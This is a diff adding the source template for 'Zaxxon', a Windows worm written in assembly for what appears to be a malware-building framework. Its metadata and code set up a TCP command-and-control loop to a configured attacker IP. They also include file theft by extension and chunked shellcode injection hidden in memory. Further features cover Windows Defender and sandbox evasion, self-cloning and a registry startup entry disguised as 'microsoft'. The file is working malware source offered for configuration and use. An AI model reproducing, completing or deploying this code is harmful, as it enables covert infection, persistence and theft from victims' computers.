@@ -1,0 +1,246 @@
+#!name##Zaxxon
+#!types##worm
+#!info##A test-stage worm written entirely in Assembly. Connects via a TCP socket and communicates using Base64-encoded messages (requires a b64-type server). Includes several basic features such as displaying a message box, creating an additional TCP socket for file transfer, directory scanning, and space for injecting two different shellcodes. The shellcodes are injected in chunks and hidden in memory. Upon execution, the worm uses basic techniques to evade Windows Defender, then attempts to clone itself and add a startup entry in the system registry. A list of available commands can be accessed via the help command.
+#!lang##asm
+#!system_FLAG##[W]
+#!globalVar##COMPILER##mingw-x64##The name of the compiler to build the executable file.
+#!globalVar##NO_DLL##True##Not include DLLs
+#!processWorm##WormLib
+#!reqSMod##Pitfall_LIB
+#!include##TCP_module1##TCP_module.asm
+#!include##AsmNinja##Ninja_module.asm
+#!include##DrMario##dr_Mario.asm
+#!include##ZCommander##Commander.asm
+#!include##ZAX_BCMD##Basic_cmd.asm
+#!include##ZAX_LOOT##Looter.asm
+#!include##ZAX_gyp_mod##GYP_mod.asm
+#!include##ZAX_STORAGE##ZAX_storage.asm
+#!include##ZAX_PACMAN##pacman.asm
+#!reqCS##BasicExe
+
+#!reqVar##IP_ADDR##Host ip address. For connection, command.##str
+#!reqVar##ZAX_core_num##Number of cores/processors. If the number of cores is too low, Worm will run fake functions and will not fully start. This option is used to counter sandbox analysis.##int
+#!setVar##ZAX_core_num##2##int
+#!reqVar##ZAX_fpath_buff##Buffer for storing file paths. Size given in bytes. Increase if you will be operating on longer paths.##str
+#!setVar##ZAX_fpath_buff##512##str
+#!reqVar##ZAX_main_pause##Delay in milliseconds before the main code starts executing. It is triggered during the anti-sandbox test.##str
+#!setVar##ZAX_main_pause##3000##str
+#!reqVar##ZAX_recv##Buffer size in bytes for receiving commands via the TCP socket. If you plan to send long commands, increase the buffer size.##str
+#!setVar##ZAX_recv##512##str
+#!reqVar##ZAX_cmd_hex##Value used to modify each character in the hex string in help text, making it less recognizable. Acts as a simple form of text obfuscation within the code.##int
+#!setVar##ZAX_cmd_hex##2##int
+#!reqVar##ZAX_path_hex##Value used to modify each character in the hex string in path name, making it less recognizable. Acts as a simple form of text obfuscation within the code.##int
+#!setVar##ZAX_path_hex##2##int
+#!reqVar##ZAX_sc1##Shellcode #1. You can add shellcodes that the worm can then operate with.##str
+#!setVar##ZAX_sc1##0##str
+#!reqVar##ZAX_sc2##Shellcode #2. You can add shellcodes that the worm can then operate with.##str
+#!setVar##ZAX_sc2##0##str
+#!reqVar##ZAX_sc_buff##Buffer size for each shellcode given in bytes.##int
+#!setVar##ZAX_sc_buff##1024##int
+#!reqVar##PAC_inj_bytes##The number of bytes injected in each step. Shellcode injection into the process is done by a special method that injects code piece by piece.##int
+#!setVar##PAC_inj_bytes##16##int
+#!reqVar##PAC_inj_pause##Pause in milliseconds between injecting a piece of shellcode.##int
+#!setVar##PAC_inj_pause##50##int
+#!reqVar##ZAX_app_name##Application (key) name in the registry. Zaxxon will add an entry to the registry with this name.##str
+#!setVar##ZAX_app_name##microsoft##str
+#!reqFood##ZAX_grab_fext##FOOD_zaxxon_fext##File extensions that Zaxxon will steal
+#!reqFood##ZAX_grab_path##FOOD_path_sought##List of paths to search.
+#!reqFood##ZAX_scode_text##FOOD_random_text##Text to hide shellcode
+#!reqVar##GUI##When set to True, the program runs as a background windowed application. When False, it runs in a console window with visible output.##str
+#!setVar##GUI##True##str
+
+
+{% if TO_TEMPLATE_GUI == False or TO_TEMPLATE_GUI == 'False' %}
+    {% set ZAXXON_ENTRY = "Main" %}
+{% else %}
+    {% set ZAXXON_ENTRY = "WinMain" %}
+{%  endif %}
+
+
+bits 64
+default rel
+
+%define ZAXXON_CORE_NUM {{ZAX_core_num}}
+%define ZAX_RECIVE_BUFFER {{ZAX_recv}}
+
+%include "TCP_module.asm"
+%include "Ninja_module.asm"
+%include "dr_Mario.asm"
+%include "Commander.asm"
+%include "Basic_cmd.asm"
+%include "Looter.asm"
+%include "GYP_mod.asm"
+%include "ZAX_storage.asm"
+%include "pacman.asm"
+
+extern printf
+extern ExitProcess
+extern MessageBoxA
+extern PITF_title
+extern PITF_Init
+extern PITF_get
+extern PITF_show_item
+
+
+
+{% set PFL_base = TOOL.AsmSh_make_table(data=PF_text, set_as_default=True)%}
+
+section .data
+    text_out: db "OUT: %s", 10, 0
+    
+    zax_text_exit: db "Exit Zaxxon", 10, 0
+    zax_text_start: db "Zaxxon starting....", 10, 0
+    zax_text_title_game: db "New Game", 10, 0
+    
+{% set ZAX_MAIN_IP = IP_ADDR%}
+    
+    zax_player_start: dd {{TOOL.AsmSh_encode(ZAX_MAIN_IP)}} ; ip addr
+    zax_player_hp: equ 4000 ; port num
+
+{% set _ = TOOL.AsmSh_reset_table() %}
+
+section .bss
+    zax_energy_buff: resb ZAX_RECIVE_BUFFER ; recive message buffer
+
+
+section .text
+    global {{ZAXXON_ENTRY}}
+
+{{ZAXXON_ENTRY}}:
+    mov rbp, rsp; for correct debugging
+    sub rsp, 40
+    call ZAX_Start
+    call EXIT
+
+
+        
+
+
+ZAX_Start:
+; Start game
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    sub rsp, 40
+    mov rcx, zax_text_start
+    call printf
+    add rsp, 40
+    
+    ; build zaxxon
+    sub rsp, 40
+    call ZAX_build_game
+    add rsp, 40
+    
+    ; init tcp and connect
+    .connect:
+        sub rsp, 40
+        mov rcx, zax_player_start
+        mov rdx, zax_player_hp
+        call TCP_Init
+        add rsp, 40
+
+    .clear_buffer:
+        lea rdi, [zax_energy_buff]  ; dest buffer
+        mov rcx, ZAX_RECIVE_BUFFER  ; bytes num
+        xor rax, rax    ; 0
+        cld ; direction FLAG
+        rep stosb
+
+    .recive:
+        sub rsp, 40
+        lea rcx, [zax_energy_buff]
+        mov rdx, ZAX_RECIVE_BUFFER
+        call TCP_recv
+        add rsp, 40
+        cmp rax, 0
+        je .connect
+        
+        sub rsp, 40
+        mov rcx, rax
+        call CMD_command
+        add rsp, 40
+        jmp .clear_buffer
+    
+    
+    
+    
+    
+    .return:
+        add rsp, 8
+        pop rbp
+        ret
+        
+
+ZAX_build_game:
+; prepare all steps
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    ; initiazlize Pitfall
+    sub rsp, 40
+    call PITF_Init
+    
+    ; run Ninja
+    call NINJA_prepare_player
+    add rsp, 40
+    cmp rax, 1
+    je .new_game
+    
+    ; initialize Commander
+    sub rsp, 40
+    call CMD_Init
+    add rsp, 40
+
+    ; initialize Basic_Cmd
+    sub rsp, 40
+    call BASC_Init
+    add rsp, 40
+    
+    ; initialize Looter
+    sub rsp, 40
+    call LOOT_Init
+    add rsp, 40
+
+    ; initialize GYP_module
+    sub rsp, 40
+    call GYP_Init
+    add rsp, 40
+
+    ; initialize Pacman
+    sub rsp, 40
+    call PAC_Init
+    add rsp, 40
+    
+    ; clone worm
+    sub rsp, 40
+    call DM_start_heal
+    add rsp, 40
+    
+    .return:
+        add rsp, 8
+        pop rbp
+        ret
+    
+    .new_game:
+        ; run fake funtcion
+        sub rsp, 40
+        call PITF_title
+        mov rcx, 0
+        mov rdx, rax
+        mov r8, zax_text_title_game
+        mov r9, 0
+        call MessageBoxA
+        call EXIT
+        add rsp, 40
+        
+
+EXIT:
+    sub rsp, 40
+    mov rcx, zax_text_exit
+    call printf
+    mov rcx, 0
+    call ExitProcess
